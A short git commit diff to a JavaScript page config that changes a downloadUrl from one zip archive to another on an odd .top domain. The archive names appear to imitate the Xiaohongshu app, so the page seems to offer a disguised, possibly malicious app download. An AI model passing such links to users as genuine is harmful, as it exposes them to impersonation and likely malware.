5bd8a00a25acac39322f644789c9e0c5be045884
aa168188aaaa <lisiajlekjw@gmail.com>
2025-07-10 22:30:43 +0800

    Update xhs03bsem.js

--- static/js/xhs03bsem.js
+++ static/js/xhs03bsem.js
@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://soelrsjkikfje-s3.top/xingin.XHSxiaoh.zip", 
+    downloadUrl: "https://soelrsjkikfje-s3.top/hingingxiaohshu.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
